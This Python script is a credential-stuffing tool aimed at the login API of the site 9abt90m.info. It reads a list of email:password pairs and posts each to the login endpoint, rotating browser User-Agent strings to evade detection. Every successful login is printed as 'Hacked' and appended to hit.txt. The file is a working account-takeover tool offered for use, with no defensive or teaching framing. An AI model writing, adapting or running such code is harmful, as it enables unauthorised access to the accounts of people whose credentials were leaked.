import requests, os
import json
import random
import time
user_agents = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
]
def login(combo, cookies):
    url = "https://9abt90m.info/api/V1L3VzZXIvYXV0aC9sb2dpbg%3D%3D"
    headers = {
        "Host": "9abt90m.info",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": random.choice(user_agents),
        "access-control-allow-credentials": "true",
        "access-control-allow-origin": "https://9abt90m.info"
    }
    combo = combo.split(":")
    data = {'mail': combo[0], 'pass': combo[1]}
    r = requests.post(
        url, headers=headers,
        data=data, cookies=cookies,
    )
    return r
def main():
    os.system("clear")
    b = '''
\033[94m                _           
               | |          
  ___  __ _ ___| |__   __ _ 
 / __|/ _` / __| '_ \ / _` |
 \__ \ (_| \__ \ | | | (_| |
 |___/\__,_|___/_| |_|\__,_|

    
'''
    print(b)
    combo_list = open(input("\033[93m[\033[91m*\033[93m]\033[96m Enter The Combo List: "), "r").read().splitlines()  
    session = requests.Session()
    session.get("https://9abt90m.info")
    cookies = [{cookie.name: cookie.value} for cookie in session.cookies]
    for combo in combo_list:
        time.sleep(random.randint(0, 1)/100)
        response = login(combo, session.cookies)
        result = json.loads(response.text)['result']
        if result == 'ok':
            print("\033[92m",combo, "    \033[91m*\033[96mHacked\033[91m*")
            combol = combo.split(":")
            f=open("hit.txt","a")
            f.write(combol[0]+":"+combol[1]+'\n')
            f.close()
        else:
        	print("\033[92m",combo, "    \033[91m*\033[93mWrong passwd\033[91m*")
if __name__ == "__main__":
    main()
